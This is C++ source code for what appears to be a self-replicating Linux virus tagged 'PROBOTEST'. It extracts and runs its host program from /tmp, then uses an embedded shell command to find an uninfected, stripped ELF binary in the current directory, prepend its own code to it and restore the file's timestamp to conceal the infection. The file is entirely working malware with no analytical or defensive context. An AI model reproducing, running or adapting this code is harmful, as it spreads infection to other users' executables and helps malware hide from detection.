#include <iostream>
#include <fstream>

const char* IDENTIFIER = "PROBOTEST";
const int MYSIZE = 14964;

using namespace std;

int main (int argc, char** argv) {
    srand(time(0));
    int c;
    string exe = "/tmp/", vir = "/tmp/", me = (string) argv[0], command;
    for (int i = 0; i < 8; i++) {
        exe += (char) ((rand() % 26) + 65);
        vir += (char) ((rand() % 26) + 65);
    }
    ifstream fi(me);
    ofstream fo(exe), fv(vir);
    if (fi.is_open() && fo.is_open() && fv.is_open()) {
        for (int i = 0; i < MYSIZE; i++) fv << (char) fi.get();
        fi.seekg(MYSIZE, fi.beg);
        while ((c = fi.get()) != -1) fo << (char) c;
        fi.close();
        fo.close();
        fv.close();
        command = "chmod u+x ";
        command += exe;
        command += " && ";
        command += exe;
        if (argc > 1)
            for (int i = 1; i < argc; i++) {
                command += " ";
                command += (string) argv[i];
            }
        command += " && rm -f ";
        command += exe;
        c = system( (command).c_str() );
        command = "VIR=$(for n in `find -mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
do \
file $n | grep -q ELF && ( \
grep -q PROBOTEST $n || ( \
echo \"$n\" \
) \
); \
done | tail -1); \
if [ ! -z \"$VIR\" ]; then \
file $VIR | grep -q stripped$ && (\
mv $VIR ${VIR}__ && \
cat ";
        command += vir;
        command += " ${VIR}__ >$VIR && \
chmod ugo+x $VIR && \
touch -r ${VIR}__ $VIR \
) \
fi; \
rm -f ${VIR}__ ";
        command += vir;
        c = system( (command).c_str() );
    }
}